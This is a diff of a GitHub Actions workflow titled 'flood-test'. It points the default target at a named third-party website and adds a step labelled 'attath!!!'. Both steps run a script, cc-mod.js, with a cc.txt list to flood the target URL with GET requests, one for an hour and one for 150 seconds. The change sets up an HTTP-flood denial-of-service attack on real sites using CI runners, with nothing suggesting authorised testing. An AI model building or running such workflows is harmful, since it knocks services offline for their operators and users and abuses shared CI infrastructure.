@@ -6,7 +6,7 @@ on:
       target_url:
         description: '目标URL'
         required: true
-        default: 'https://blog.aznb.top'
+        default: 'https://www.minearm.org'
 
 jobs:
   flood-test:
@@ -23,3 +23,7 @@ jobs:
       - name: Run flood test
         run: |
           node cc-mod.js ${{ github.event.inputs.target_url }} cc.txt 3600 4 GET
+
+      - name: attath!!!
+        run: |
+          node cc-mod.js ${{ github.event.inputs.target_url }} cc.txt 150 4 GET
